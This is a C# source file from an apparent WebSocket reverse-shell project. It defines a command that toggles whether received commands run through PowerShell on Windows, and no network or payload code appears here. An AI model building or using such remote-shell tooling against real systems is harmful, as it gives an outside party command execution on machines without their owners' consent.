using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class TogglePowerShellCommand : Command
    {
        public string ExecuteCommand(string command)
        {
            if (SystemCommandUtil.IsWindows && TogglePowerShell(command) != null)
            {
                return "Switched to PowerShell successfully";
            }

            return "There is a problem with the command";
        }

        private static String TogglePowerShell(String commands)
        {

            if (commands.Equals("powershell", StringComparison.OrdinalIgnoreCase))
            {
                SystemCommandUtil.RunPowerShell = !SystemCommandUtil.RunPowerShell;
                return "Switched to Powershell mode";

            }
            return null;
        }
    }
}
